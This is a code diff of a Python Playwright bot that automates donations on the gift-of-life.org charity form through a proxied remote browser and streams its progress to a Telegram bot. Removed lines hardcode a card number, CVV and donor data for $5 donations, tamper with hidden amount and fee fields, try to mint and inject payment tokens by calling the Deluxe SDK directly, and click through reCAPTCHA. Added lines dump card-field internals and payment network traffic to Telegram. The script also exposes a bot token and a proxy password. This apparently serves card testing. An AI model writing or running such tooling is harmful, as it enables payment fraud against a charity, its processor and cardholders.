@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Gift of Life Donation v17 — Direct Deluxe SDK tokenization
+Gift of Life Donation v18 — Deep Inspection of card fields
 """
 
 import os
@@ -17,7 +17,6 @@ except ImportError:
     os.system("playwright install chromium")
     from playwright.sync_api import sync_playwright
 
-# ═══════════════════════════════════════════════════
 BOT_TOKEN = "8647240736:AAEGXuwmtZkUvAfbURX2BcyyuoWD-TekP_0"
 CHAT_ID = 6843321125
 
@@ -28,62 +27,20 @@ BD_PASS = "eyr0v46j28pi"
 
 TARGET_URL = "https://gift-of-life.org/make-a-donation/"
 
-FIRST_NAME = "Wafa"
-LAST_NAME = "Bro"
-EMAIL = "wafabro980@gmail.com"
-PHONE = "2019679866"
-ADDRESS_1 = "W356"
-ADDRESS_2 = "Apt 12"
-CITY = "Carifnia"
-STATE_VALUE = "1305"
-ZIP = "90011"
-
-CARD_NUMBER = "5178057879094972"
-CARD_NAME = "Wafa Bro"
-CARD_MONTH = "08"
-CARD_YEAR = "2030"
-CARD_CVV = "123"
-CARD_TYPE = "MasterCard"
-
-DONATION_AMOUNT = "5"
-
 P = "_ArrevaOnlineDonationsPortlet_WAR_ArrevaOnlineDonationsPortlet_:form1:"
-
-
-def sid(name):
-    return f'[id="{P}{name}"]'
-
 
 def tg_msg(text):
     try:
-        requests.post(
-            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            data={"chat_id": CHAT_ID, "text": text[:4000], "parse_mode": "HTML"},
-            timeout=15
-        )
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                      data={"chat_id": CHAT_ID, "text": text[:4000], "parse_mode": "HTML"}, timeout=15)
     except Exception as e:
         print(f"TG msg error: {e}", flush=True)
-
-
-def tg_photo(path, caption=""):
-    try:
-        with open(path, "rb") as f:
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
-                data={"chat_id": CHAT_ID, "caption": caption[:1000]},
-                files={"photo": f},
-                timeout=30
-            )
-    except Exception as e:
-        print(f"TG photo error: {e}", flush=True)
-
 
 def tg_long(label, text, chunk=3500):
     tg_msg(f"{label} (len={len(text)})")
     for i in range(0, len(text), chunk):
         tg_msg(f"<pre>{text[i:i+chunk]}</pre>")
         time.sleep(0.3)
-
 
 def find_donation_frame(page, total_seconds=120):
     start = time.time()
@@ -93,404 +50,311 @@ def find_donation_frame(page, total_seconds=120):
         for f in page.frames:
             try:
                 if f.locator('[id*="datafirst"]').first.count() > 0:
-                    tg_msg(f"✅ Found form in frame name='{f.name}'")
                     return f, attempt
             except Exception:
                 pass
         time.sleep(2)
     return None, attempt
 
-
-def fill_text_field(frame, field_suffix, value, label=""):
-    try:
-        el = frame.locator(sid(field_suffix)).first
-        el.wait_for(state="visible", timeout=10000)
-        el.fill(str(value), timeout=5000)
-        el.evaluate("el => el.dispatchEvent(new Event('input',{bubbles:true}))")
-        actual = frame.evaluate(
-            "(id) => { const el = document.getElementById(id); return el ? el.value : null; }",
-            f"{P}{field_suffix}"
-        )
-        tg_msg(f"{'✅' if actual == str(value) else '⚠️'} {label or field_suffix}: '{actual}'")
-        return actual == str(value)
-    except Exception as e:
-        tg_msg(f"❌ {label or field_suffix}: {str(e)[:150]}")
-        return False
-
-
-def select_option_safe(frame, field_suffix, value, label=""):
-    try:
-        ok = frame.evaluate(
-            """([id, val]) => {
-                const el = document.getElementById(id);
-                if (!el) return false;
-                el.value = val;
-                el.dispatchEvent(new Event('change', { bubbles: true }));
-                return true;
-            }""",
-            [f"{P}{field_suffix}", value]
-        )
-        tg_msg(f"{'✅' if ok else '❌'} {label or field_suffix}: '{value}'")
-        return ok
-    except Exception as e:
-        tg_msg(f"❌ {label or field_suffix}: {str(e)[:150]}")
-        return False
-
-
-def remove_processing_fee(frame):
-    try:
-        result = frame.evaluate(
-            f"""() => {{
-                const P = '{P}';
-                const cb = document.getElementById(P + 'includeFee_input');
-                if (!cb) return {{found: false}};
-                if (cb.checked) cb.click();
-                if (cb.checked) {{ cb.checked = false; cb.dispatchEvent(new Event('change', {{bubbles: true}})); }}
-                return {{found: true, checked: cb.checked}};
-            }}"""
-        )
-        tg_msg(f"✅ includeFee: {json.dumps(result, ensure_ascii=False)}")
-        return result.get("checked") == False
-    except Exception as e:
-        tg_msg(f"❌ remove fee: {str(e)[:150]}")
-        return False
-
-
-def set_amount_exact(frame, amount):
-    tg_msg(f"🔄 Setting exact amount = ${amount}")
-
-    try:
-        frame.evaluate(
-            f"""() => {{
-                const rb = document.getElementById('{P}rb_amount:4');
-                if (rb) {{ rb.checked = true; rb.dispatchEvent(new Event('change', {{bubbles: true}})); }}
-            }}"""
-        )
-        tg_msg("✅ Other radio checked")
-    except Exception as e:
-        tg_msg(f"⚠️ Other: {str(e)[:120]}")
-
-    time.sleep(3)
-
-    try:
-        frame.evaluate(
-            """(amt) => {
-                const el = document.querySelector('input[id*="other_amount"]');
-                if (!el) return false;
-                el.value = amt;
-                el.dispatchEvent(new Event('input', { bubbles: true }));
-                el.dispatchEvent(new Event('change', { bubbles: true }));
-                return true;
-            }""",
-            str(amount)
-        )
-        tg_msg(f"✅ other_amount = {amount}")
-    except Exception as e:
-        tg_msg(f"❌ other_amount: {str(e)[:120]}")
-
-    time.sleep(3)
-    remove_processing_fee(frame)
-    time.sleep(2)
-
-    total = float(amount)
-    try:
-        frame.evaluate(
-            f"""(total) => {{
-                const P = '{P}';
-                const atp = document.getElementById(P + 'amount_to_pay');
-                if (atp) atp.value = total.toFixed(2);
-                const lt = document.getElementById('label_total_amount');
-                if (lt) lt.value = '$ ' + total.toFixed(2);
-                const lth = document.getElementById(P + 'label_total_hidden_amount');
-                if (lth) lth.value = '$ ' + total.toFixed(2);
-                const lp = document.getElementById(P + 'label_payment_amount');
-                if (lp) lp.value = '$ ' + total.toFixed(2);
-                const oao = document.getElementById(P + 'other_amount_on');
-                if (oao) oao.value = 'true';
-                const fa = document.getElementById(P + 'fee_amount');
-                if (fa) fa.value = '0.00';
-            }}""",
-            total
-        )
-        tg_msg(f"✅ hidden fields updated: ${total:.2f}")
-    except Exception as e:
-        tg_msg(f"❌ hidden: {str(e)[:150]}")
-
-
-# ═══════════════════════════════════════════════════
-#  DELUXE SDK EXPLORATION
-# ═══════════════════════════════════════════════════
-
-def explore_deluxe_sdk(frame, page):
-    """يستكشف Deluxe SDK — كل المتغيرات والدوال المتاحة"""
-    tg_msg("🔍 Exploring Deluxe SDK...")
-
-    # 1. استخرج JS files من Deluxe
-    try:
-        deluxe_scripts = frame.evaluate("""() => {
-            return Array.from(document.querySelectorAll('script[src]'))
-                .map(s => s.src)
-                .filter(u => u.includes('deluxe') || u.includes('payments'));
-        }""")
-        tg_msg(f"📋 Deluxe scripts: {json.dumps(deluxe_scripts, ensure_ascii=False)}")
-    except Exception as e:
-        tg_msg(f"⚠️ scripts: {str(e)[:150]}")
-
-    # 2. ابحث عن Deluxe global object
-    try:
-        deluxe_info = frame.evaluate("""() => {
-            const result = {
-                has_window_Deluxe: typeof window.Deluxe !== 'undefined',
-                deluxe_keys: [],
-                window_keys_with_deluxe: [],
-                window_keys_with_payment: [],
-                window_keys_with_token: [],
-            };
-            if (typeof window.Deluxe !== 'undefined') {
-                try {
-                    result.deluxe_keys = Object.keys(window.Deluxe);
-                } catch(e) {}
-            }
-            for (const k of Object.keys(window)) {
-                const kl = k.toLowerCase();
-                if (kl.includes('deluxe')) result.window_keys_with_deluxe.push(k);
-                if (kl.includes('payment') && kl.includes('sdk')) result.window_keys_with_payment.push(k);
-                if (kl.includes('token') && (kl.includes('create') || kl.includes('cc') || kl.includes('card'))) 
-                    result.window_keys_with_token.push(k);
-            }
-            return result;
-        }""")
-        tg_msg(f"📋 Deluxe globals: {json.dumps(deluxe_info, ensure_ascii=False)[:2000]}")
-    except Exception as e:
-        tg_msg(f"⚠️ globals: {str(e)[:150]}")
-
-    # 3. ابحث عن iframe بتاع Deluxe
-    try:
-        deluxe_iframes = frame.evaluate("""() => {
-            return Array.from(document.querySelectorAll('iframe'))
-                .map(f => ({id: f.id, name: f.name, src: (f.src || '').slice(0, 200)}))
-                .filter(f => f.src.includes('deluxe') || f.src.includes('payment') || f.src.includes('secure'));
-        }""")
-        tg_msg(f"📋 Deluxe iframes: {json.dumps(deluxe_iframes, ensure_ascii=False)}")
-    except Exception as e:
-        tg_msg(f"⚠️ iframes: {str(e)[:150]}")
-
-    # 4. استخرج Deluxe JS content
-    try:
-        deluxe_js_urls = frame.evaluate("""() => {
-            return Array.from(document.querySelectorAll('script[src]'))
-                .map(s => s.src)
-                .filter(u => u.includes('deluxe'));
-        }""")
-        for url in deluxe_js_urls:
-            tg_msg(f"📥 Fetching: {url[-80:]}")
-            try:
-                resp = page.request.get(url, timeout=30000)
-                if resp.status == 200:
-                    js_content = resp.text()
-                    # ابحث عن createToken/tokenize
-                    keywords = ['createToken', 'tokenize', 'ccToken', 'paymentToken', 
-                               'Deluxe.create', 'new Deluxe', 'window.Deluxe']
-                    found = [k for k in keywords if k in js_content]
-                    tg_msg(f"   keywords found: {found}")
-                    
-                    # ابعت أول 5000 حرف
-                    if len(js_content) > 5000:
-                        tg_long(f"📄 {url.split('/')[-1]} (first 5000)", js_content[:5000])
-                    else:
-                        tg_long(f"📄 {url.split('/')[-1]}", js_content)
-            except Exception as e:
-                tg_msg(f"   ⚠️ fetch: {str(e)[:100]}")
-    except Exception as e:
-        tg_msg(f"⚠️ fetch JS: {str(e)[:150]}")
-
-
-def try_deluxe_tokenize(frame, page):
-    """يحاول يستدعي Deluxe createToken بـ طرق مختلفة"""
-    tg_msg("🔄 Trying Deluxe tokenization...")
-
-    # نجرب كل الاحتمالات
-    attempts = [
-        # 1. window.Deluxe.createToken
-        """async (card) => {
-            if (typeof window.Deluxe === 'undefined') return {error: 'no Deluxe'};
-            if (typeof window.Deluxe.createToken !== 'function') return {error: 'no createToken', keys: Object.keys(window.Deluxe)};
-            return new Promise((resolve) => {
-                try {
-                    window.Deluxe.createToken(card, (err, result) => {
-                        if (err) resolve({error: String(err)});
-                        else resolve({success: true, result});
-                    });
-                } catch(e) { resolve({error: String(e)}); }
-            });
-        }""",
+def inspect_field(frame, field_suffix, label):
+    """فحص عميق لحقل واحد"""
+    tg_msg(f"🔍 Inspecting {label} ({field_suffix})...")
+    
+    result = frame.evaluate("""(id) => {
+        const el = document.getElementById(id);
+        if (!el) return {error: 'not found'};
         
-        # 2. Deluxe.tokenize
-        """async (card) => {
-            if (typeof window.Deluxe === 'undefined') return {error: 'no Deluxe'};
-            if (typeof window.Deluxe.tokenize !== 'function') return {error: 'no tokenize'};
-            return new Promise((resolve) => {
-                try {
-                    window.Deluxe.tokenize(card, (err, result) => {
-                        if (err) resolve({error: String(err)});
-                        else resolve({success: true, result});
-                    });
-                } catch(e) { resolve({error: String(e)}); }
-            });
-        }""",
-        
-        # 3. Deluxe.createPaymentToken
-        """async (card) => {
-            if (typeof window.Deluxe === 'undefined') return {error: 'no Deluxe'};
-            if (typeof window.Deluxe.createPaymentToken !== 'function') return {error: 'no createPaymentToken'};
-            return new Promise((resolve) => {
-                try {
-                    window.Deluxe.createPaymentToken(card, (err, result) => {
-                        if (err) resolve({error: String(err)});
-                        else resolve({success: true, result});
-                    });
-                } catch(e) { resolve({error: String(e)}); }
-            });
-        }""",
-    ]
-
-    card_data = {
-        "cardNumber": CARD_NUMBER,
-        "cvv": CARD_CVV,
-        "expirationMonth": CARD_MONTH,
-        "expirationYear": CARD_YEAR,
-        "nameOnCard": CARD_NAME,
-    }
-
-    for i, attempt in enumerate(attempts):
-        try:
-            tg_msg(f"🔄 Attempt {i+1}...")
-            result = frame.evaluate(attempt, card_data)
-            tg_msg(f"📋 Attempt {i+1} result: {json.dumps(result, ensure_ascii=False)[:500] if result else 'null'}")
+        const info = {
+            // 1. Basic
+            tagName: el.tagName,
+            type: el.type,
+            id: el.id,
+            name: el.name,
+            className: el.className,
+            placeholder: el.placeholder,
+            value: el.value,
+            maxLength: el.maxLength,
+            readOnly: el.readOnly,
+            disabled: el.disabled,
             
-            if result and result.get("success"):
-                return result.get("result")
-        except Exception as e:
-            tg_msg(f"⚠️ Attempt {i+1}: {str(e)[:150]}")
+            // 2. Visibility & position
+            offsetWidth: el.offsetWidth,
+            offsetHeight: el.offsetHeight,
+            offsetTop: el.offsetTop,
+            offsetLeft: el.offsetLeft,
+            
+            // 3. Style
+            computedStyle: (() => {
+                try {
+                    const cs = window.getComputedStyle(el);
+                    return {
+                        display: cs.display,
+                        visibility: cs.visibility,
+                        opacity: cs.opacity,
+                        pointerEvents: cs.pointerEvents,
+                        position: cs.position,
+                        zIndex: cs.zIndex,
+                        webkitTextSecurity: cs.webkitTextSecurity || cs.textSecurity,
+                    };
+                } catch(e) { return {error: String(e)}; }
+            })(),
+            
+            // 4. Attributes
+            attributes: (() => {
+                const attrs = {};
+                for (const a of el.attributes) {
+                    attrs[a.name] = a.value;
+                }
+                return attrs;
+            })(),
+            
+            // 5. HTML
+            outerHTML: el.outerHTML,
+            innerHTML: el.innerHTML,
+            
+            // 6. Parent
+            parentTag: el.parentElement ? el.parentElement.tagName : null,
+            parentId: el.parentElement ? el.parentElement.id : null,
+            parentClass: el.parentElement ? el.parentElement.className : null,
+            parentOuterHTML: el.parentElement ? el.parentElement.outerHTML.slice(0, 2000) : null,
+            
+            // 7. Shadow DOM
+            hasShadowRoot: !!el.shadowRoot,
+            shadowRootHTML: el.shadowRoot ? el.shadowRoot.innerHTML : null,
+            
+            // 8. Event listeners (partial - playwright can't get all)
+            hasOninput: !!el.oninput,
+            hasOnchange: !!el.onchange,
+            hasOnkeydown: !!el.onkeydown,
+            hasOnkeyup: !!el.onkeyup,
+            hasOnkeypress: !!el.onkeypress,
+            hasOnblur: !!el.onblur,
+            hasOnfocus: !!el.onfocus,
+            hasOnpaste: !!el.onpaste,
+            hasOncopy: !!el.oncopy,
+            hasOncut: !!el.oncut,
+            
+            // 9. jQuery handlers
+            jqueryEvents: (() => {
+                try {
+                    if (typeof window.jQuery === 'undefined') return null;
+                    const events = window.jQuery._data(el, 'events');
+                    if (!events) return null;
+                    const result = {};
+                    for (const evt in events) {
+                        result[evt] = events[evt].map(h => ({
+                            type: h.type,
+                            namespace: h.namespace,
+                            selector: h.selector,
+                        }));
+                    }
+                    return result;
+                } catch(e) { return {error: String(e)}; }
+            })(),
+            
+            // 10. React/Vue props
+            reactProps: (() => {
+                try {
+                    const keys = Object.keys(el).filter(k => k.startsWith('__react') || k.startsWith('_react'));
+                    return keys.length > 0 ? keys : null;
+                } catch(e) { return null; }
+            })(),
+            
+            // 11. DOM properties
+            allOwnProps: (() => {
+                try {
+                    return Object.getOwnPropertyNames(el).filter(k => !k.startsWith('_') && k !== 'style');
+                } catch(e) { return []; }
+            })(),
+            
+            // 12. Custom properties (non-native)
+            customProps: (() => {
+                try {
+                    const result = {};
+                    for (const k in el) {
+                        try {
+                            const val = el[k];
+                            if (typeof val === 'string' || typeof val === 'number' || typeof val === 'boolean') {
+                                if (k.includes('card') || k.includes('token') || k.includes('encrypt') || 
+                                    k.includes('deluxe') || k.includes('sdk') || k.includes('secure')) {
+                                    result[k] = val;
+                                }
+                            }
+                        } catch(e) {}
+                    }
+                    return result;
+                } catch(e) { return {}; }
+            })(),
+        };
         
-        time.sleep(1)
+        return info;
+    }""", f"{P}{field_suffix}")
+    
+    tg_long(f"🔍 {label} INSPECTION", json.dumps(result, indent=1, ensure_ascii=False))
+    return result
 
-    return None
-
-
-def inject_token(frame, token):
-    """يحقن token في paymentToken hidden field"""
-    try:
-        ok = frame.evaluate(
-            f"""(token) => {{
-                const el = document.getElementById('{P}paymentToken');
-                if (!el) return false;
-                el.value = typeof token === 'string' ? token : JSON.stringify(token);
-                el.dispatchEvent(new Event('input', {{bubbles: true}}));
-                el.dispatchEvent(new Event('change', {{bubbles: true}}));
-                return true;
-            }}""",
-            token
-        )
-        tg_msg(f"{'✅' if ok else '❌'} paymentToken injected")
+def inspect_all_inputs_near(frame, field_suffix):
+    """يفحص كل الـ inputs اللي حوالين حقل معين"""
+    result = frame.evaluate("""(id) => {
+        const el = document.getElementById(id);
+        if (!el) return {error: 'not found'};
         
-        # تحقق
-        actual = frame.evaluate(
-            "(id) => { const el = document.getElementById(id); return el ? el.value : null; }",
-            f"{P}paymentToken"
-        )
-        tg_msg(f"📋 paymentToken value: '{str(actual)[:80]}...'")
-        return ok
-    except Exception as e:
-        tg_msg(f"❌ inject: {str(e)[:150]}")
-        return False
+        const parent = el.closest('div, fieldset, tr, td') || el.parentElement;
+        if (!parent) return {error: 'no parent'};
+        
+        const inputs = [];
+        parent.querySelectorAll('input, select, textarea, iframe, [role="textbox"]').forEach(inp => {
+            inputs.push({
+                tag: inp.tagName,
+                type: inp.type || '',
+                id: inp.id || '',
+                name: inp.name || '',
+                className: inp.className || '',
+                value: (inp.value || '').slice(0, 20),
+                visible: !!(inp.offsetWidth || inp.offsetHeight || inp.getClientRects().length),
+                outerHTML: (inp.outerHTML || '').slice(0, 500),
+            });
+        });
+        return {parentHTML: parent.outerHTML.slice(0, 3000), inputs};
+    }""", f"{P}{field_suffix}")
+    
+    return result
 
-
-# ═══════════════════════════════════════════════════
-#  CAPTCHA
-# ═══════════════════════════════════════════════════
-
-def solve_captcha(frame, page):
-    tg_msg("🔄 reCAPTCHA")
+def test_typing_behavior(frame, field_suffix, label):
+    """يختبر إيه اللي بيحصل لما نكتب بإيد"""
+    tg_msg(f"⌨️ Testing typing behavior for {label}...")
+    
+    results = []
+    
+    # 1. Click + type
     try:
-        token = frame.evaluate("""() => {
-            const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
-            return ta ? ta.value : '';
-        }""")
-        tg_msg(f"📌 Token len = {len(token) if token else 0}")
-        if token and len(token) > 20:
-            return True
-    except Exception:
-        pass
-
-    try:
-        for f in page.frames:
-            try:
-                if "recaptcha/api2/anchor" in (f.url or ""):
-                    cb = f.locator("#recaptcha-anchor").first
-                    cb.wait_for(state="attached", timeout=8000)
-                    cb.click(force=True, timeout=5000)
-                    tg_msg("✅ Clicked reCAPTCHA")
-                    break
-            except Exception:
-                continue
-
-        for i in range(25):
-            try:
-                token = frame.evaluate("""() => {
-                    const ta = document.querySelector('textarea[name="g-recaptcha-response"]');
-                    return ta ? ta.value : '';
-                }""")
-                if token and len(token) > 20:
-                    tg_msg(f"✅ reCAPTCHA solved! len={len(token)}")
-                    return True
-            except Exception:
-                pass
-            time.sleep(1)
-        tg_msg("⚠️ reCAPTCHA still empty")
-        return False
+        el = frame.locator(f'[id="{P}{field_suffix}"]').first
+        el.click(timeout=3000)
+        frame.page.keyboard.type("1", delay=100)
+        time.sleep(0.5)
+        v1 = frame.evaluate("(id) => document.getElementById(id)?.value", f"{P}{field_suffix}")
+        results.append(f"M1 click+type(1): '{v1}'")
     except Exception as e:
-        tg_msg(f"⚠️ reCAPTCHA: {str(e)[:150]}")
-        return False
+        results.append(f"M1 ERR: {str(e)[:80]}")
+    
+    # 2. Fill "1"
+    try:
+        el = frame.locator(f'[id="{P}{field_suffix}"]').first
+        el.fill("2", timeout=3000)
+        time.sleep(0.5)
+        v2 = frame.evaluate("(id) => document.getElementById(id)?.value", f"{P}{field_suffix}")
+        results.append(f"M2 fill(2): '{v2}'")
+    except Exception as e:
+        results.append(f"M2 ERR: {str(e)[:80]}")
+    
+    # 3. JS set "3"
+    try:
+        frame.evaluate("""(id) => {
+            const el = document.getElementById(id);
+            if (el) { el.value = '3'; el.dispatchEvent(new Event('input', {bubbles: true})); }
+        }""", f"{P}{field_suffix}")
+        time.sleep(0.5)
+        v3 = frame.evaluate("(id) => document.getElementById(id)?.value", f"{P}{field_suffix}")
+        results.append(f"M3 JS(3): '{v3}'")
+    except Exception as e:
+        results.append(f"M3 ERR: {str(e)[:80]}")
+    
+    tg_msg(f"⌨️ {label} typing results:\n" + "\n".join(results))
 
+def check_global_objects(frame, page):
+    """يفحص كل الـ globals اللي ممكن تكون بتتحكم في البطاقة"""
+    tg_msg("🌐 Checking global objects...")
+    
+    result = frame.evaluate("""() => {
+        const result = {
+            window_keys: [],
+            card_related_globals: {},
+            iframes_in_frame: [],
+            script_urls: [],
+        };
+        
+        // 1. كل الـ window keys
+        for (const k of Object.keys(window)) {
+            const kl = k.toLowerCase();
+            if (kl.includes('card') || kl.includes('payment') || kl.includes('token') || 
+                kl.includes('encrypt') || kl.includes('secure') || kl.includes('deluxe') ||
+                kl.includes('checkout') || kl.includes('sdk') || kl.includes('stripe') ||
+                kl.includes('square') || kl.includes('braintree')) {
+                try {
+                    const v = window[k];
+                    result.card_related_globals[k] = {
+                        type: typeof v,
+                        isFunction: typeof v === 'function',
+                        isObject: typeof v === 'object',
+                        keys: typeof v === 'object' && v ? Object.keys(v).slice(0, 20) : null,
+                    };
+                } catch(e) {
+                    result.card_related_globals[k] = {error: String(e)};
+                }
+            }
+        }
+        
+        // 2. iframes جوا الـ frame
+        document.querySelectorAll('iframe').forEach((f, i) => {
+            result.iframes_in_frame.push({
+                index: i,
+                id: f.id,
+                name: f.name,
+                src: (f.src || '').slice(0, 200),
+                visible: !!(f.offsetWidth || f.offsetHeight),
+            });
+        });
+        
+        // 3. scripts
+        document.querySelectorAll('script[src]').forEach(s => {
+            result.script_urls.push(s.src);
+        });
+        
+        return result;
+    }""")
+    
+    tg_long("🌐 GLOBALS", json.dumps(result, indent=1, ensure_ascii=False))
 
-def handle_acceptance(page):
-    tg_msg("🔄 Checking Acceptance popup...")
-    for i in range(30):
-        try:
-            yes_btn = page.locator(".ui-confirmdialog-yes").first
-            if yes_btn.count() > 0 and yes_btn.is_visible():
-                tg_msg("✅ Clicking Yes (Continue)")
-                yes_btn.click(timeout=5000)
-                return True
-        except Exception:
-            pass
-        try:
-            cont = page.locator("button:has-text('Continue')").first
-            if cont.count() > 0 and cont.is_visible():
-                tg_msg("✅ Clicking Continue")
-                cont.click(timeout=5000)
-                return True
-        except Exception:
-            pass
-        time.sleep(1)
-    tg_msg("⚠️ No acceptance popup")
-    return False
-
-
-# ═══════════════════════════════════════════════════
-#  MAIN
-# ═══════════════════════════════════════════════════
+def check_network_after_typing(page, frame):
+    """يفحص network requests اللي بتحصل بعد الكتابة"""
+    tg_msg("📡 Setting up network monitor for typing...")
+    
+    network_requests = []
+    
+    def on_request(req):
+        url = req.url.lower()
+        if any(k in url for k in ['deluxe', 'payment', 'token', 'card', 'encrypt', 'secure', 'cc']):
+            network_requests.append({
+                'url': req.url[:200],
+                'method': req.method,
+                'post_data': (req.post_data or '')[:500],
+            })
+    
+    page.on("request", on_request)
+    
+    # اكتب في الحقل
+    try:
+        el = frame.locator(f'[id="{P}cardNumber"]').first
+        el.click(timeout=3000)
+        frame.page.keyboard.type("5", delay=200)
+        time.sleep(2)
+    except Exception as e:
+        tg_msg(f"⚠️ typing error: {str(e)[:100]}")
+    
+    if network_requests:
+        tg_long("📡 NETWORK AFTER TYPING", json.dumps(network_requests, indent=1, ensure_ascii=False))
+    else:
+        tg_msg("📡 NETWORK AFTER TYPING: no requests")
 
 def run():
-    tg_msg("🚀 Gift of Life Donation v17 — Deluxe SDK Direct")
+    tg_msg("🚀 Gift of Life v18 — DEEP INSPECTION")
 
     cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"
 
     try:
         pw = sync_playwright().start()
         browser = pw.chromium.connect_over_cdp(cdp_url, timeout=120000)
-        tg_msg("✅ Connected to BrightData")
+        tg_msg("✅ Connected")
     except Exception as e:
         tg_msg(f"❌ Connect: {str(e)[:200]}")
         return
@@ -504,7 +368,8 @@ def run():
     page = context.new_page()
     page.set_default_timeout(60000)
 
-    tg_msg("🔄 [1] Opening...")
+    # 1. افتح
+    tg_msg("🔄 Opening...")
     try:
         page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=60000)
         time.sleep(10)
@@ -513,169 +378,59 @@ def run():
         return
     tg_msg("✅ Page loaded")
 
-    tg_msg("🔄 [2] Finding form...")
+    # 2. ابحث عن الـ frame
+    tg_msg("🔄 Finding form...")
     frame, attempts = find_donation_frame(page, 120)
-    if not frame:
-        try:
-            page.reload(wait_until="domcontentloaded", timeout=60000)
-            time.sleep(15)
-        except Exception:
-            pass
-        frame, attempts = find_donation_frame(page, 90)
     if not frame:
         tg_msg("❌ not found")
         return
     tg_msg(f"✅ frame='{frame.name}'")
     time.sleep(5)
 
-    # 3. استكشاف Deluxe
-    tg_msg("🔄 [3] Exploring Deluxe SDK...")
-    explore_deluxe_sdk(frame, page)
+    # 3. فحص عميق لكل حقل
+    tg_msg("🔄 [3] Deep inspection of card fields...")
+    inspect_field(frame, "cardNumber", "Card Number")
+    inspect_field(frame, "cardCSV", "CVV")
+    inspect_field(frame, "nameOnCard", "Name on Card")
 
-    # 4. المبلغ
-    tg_msg("🔄 [4] Setting amount...")
-    set_amount_exact(frame, DONATION_AMOUNT)
+    # 4. فحص الـ inputs الحوالين
+    tg_msg("🔄 [4] Inspecting nearby inputs...")
+    nearby = inspect_all_inputs_near(frame, "cardNumber")
+    tg_long("📋 NEARBY INPUTS", json.dumps(nearby, indent=1, ensure_ascii=False)[:8000])
 
-    # 5. بيانات المتبرع
-    tg_msg("🔄 [5] Donor info...")
-    fill_text_field(frame, "datafirst", FIRST_NAME, "First name")
-    fill_text_field(frame, "datalast", LAST_NAME, "Last name")
-    fill_text_field(frame, "email", EMAIL, "Email")
-    fill_text_field(frame, "data_phone", PHONE, "Phone")
-    fill_text_field(frame, "data_address_one", ADDRESS_1, "Address")
-    fill_text_field(frame, "data_address_two", ADDRESS_2, "Apt/Suite")
-    fill_text_field(frame, "data_address_city", CITY, "City")
-    fill_text_field(frame, "data_address_zip", ZIP, "Zip")
+    # 5. فحص globals
+    tg_msg("🔄 [5] Checking globals...")
+    check_global_objects(frame, page)
 
+    # 6. اختبار الكتابة
+    tg_msg("🔄 [6] Testing typing behavior...")
+    test_typing_behavior(frame, "cardNumber", "Card Number")
+
+    # 7. مراقبة network بعد الكتابة
+    tg_msg("🔄 [7] Monitoring network...")
+    check_network_after_typing(page, frame)
+
+    # 8. screenshot
     try:
-        us_value = frame.evaluate(
-            f"""() => {{
-                const sel = document.querySelector('select[id="{P}data_Rcountry"]');
-                if (!sel) return null;
-                for (const o of sel.options) {{
-                    const t = o.text.trim().toLowerCase();
-                    if (t === 'united states' || t === 'usa' || t === 'us') return o.value;
-                }}
-                return null;
-            }}"""
-        )
-        if us_value:
-            select_option_safe(frame, "data_Rcountry", us_value, f"Country (US={us_value})")
-    except Exception as e:
-        tg_msg(f"⚠️ Country: {str(e)[:150]}")
-
-    select_option_safe(frame, "data_Rstate", STATE_VALUE, "State (CA)")
-
-    # 6. cardType + exp (كلهم select)
-    select_option_safe(frame, "cardType", CARD_TYPE, "Card type")
-    select_option_safe(frame, "expiration_date_month", CARD_MONTH, "Exp month")
-    select_option_safe(frame, "expiration_date_year", CARD_YEAR, "Exp year")
-
-    # 7. Deluxe tokenize
-    tg_msg("🔄 [7] Attempting Deluxe tokenization...")
-    token_result = try_deluxe_tokenize(frame, page)
-
-    if token_result:
-        tg_msg(f"✅ Got token: {json.dumps(token_result, ensure_ascii=False)[:500]}")
-        # حاول تحقن
-        if isinstance(token_result, dict):
-            token_str = token_result.get("token") or token_result.get("paymentToken") or json.dumps(token_result)
-        else:
-            token_str = str(token_result)
-        inject_token(frame, token_str)
-    else:
-        tg_msg("❌ No token obtained")
-        # جرّب ملء الحقول بـ fill عادي بس (مش هيشتغل بس للتأكد)
-        try:
-            frame.locator(sid("cardNumber")).first.fill(CARD_NUMBER, timeout=3000)
-            frame.locator(sid("cardCSV")).first.fill(CARD_CVV, timeout=3000)
-            tg_msg("⚠️ Tried direct fill anyway")
-        except Exception as e:
-            tg_msg(f"⚠️ direct fill: {str(e)[:100]}")
-
-    try:
-        page.screenshot(path="/tmp/before_captcha.png", full_page=True)
-        tg_photo("/tmp/before_captcha.png", "📸 Before captcha")
+        page.screenshot(path="/tmp/inspect.png", full_page=True)
+        with open("/tmp/inspect.png", "rb") as f:
+            requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
+                data={"chat_id": CHAT_ID, "caption": "📸 Inspection state"},
+                files={"photo": f},
+                timeout=30
+            )
     except Exception:
         pass
 
-    # 8. captcha
-    captcha_ok = solve_captcha(frame, page)
-
-    # 9. Pre-submit
-    tg_msg("🔄 [9] Verifying...")
-    try:
-        vals = frame.evaluate(
-            f"""() => {{
-                const g = (n) => {{ const el = document.getElementById('{P}' + n); return el ? el.value : null; }};
-                const cb = document.getElementById('{P}includeFee_input');
-                return {{
-                    card_num_len: (g('cardNumber') || '').length,
-                    cvv_len: (g('cardCSV') || '').length,
-                    payment_token_len: (g('paymentToken') || '').length,
-                    card_type: g('cardType'),
-                    amount_to_pay: g('amount_to_pay'),
-                    includeFee: cb ? cb.checked : null,
-                    recaptcha_len: (g('g-recaptcha-response') || '').length,
-                }};
-            }}"""
-        )
-        tg_msg(f"📋 Pre-submit:\n<pre>{json.dumps(vals, indent=1, ensure_ascii=False)}</pre>")
-    except Exception as e:
-        tg_msg(f"⚠️ Verify: {str(e)[:150]}")
-
-    # 10. Submit
-    tg_msg("🔄 [10] Clicking Submit...")
-    try:
-        btn = frame.locator(sid("j_idt1913")).first
-        btn.wait_for(state="visible", timeout=10000)
-        btn.click(timeout=5000)
-        tg_msg("✅ Submit clicked")
-    except Exception as e:
-        tg_msg(f"⚠️ Submit: {str(e)[:150]}")
-
-    time.sleep(5)
-
-    # 11. Acceptance
-    tg_msg("🔄 [11] Handling Acceptance...")
-    handle_acceptance(page)
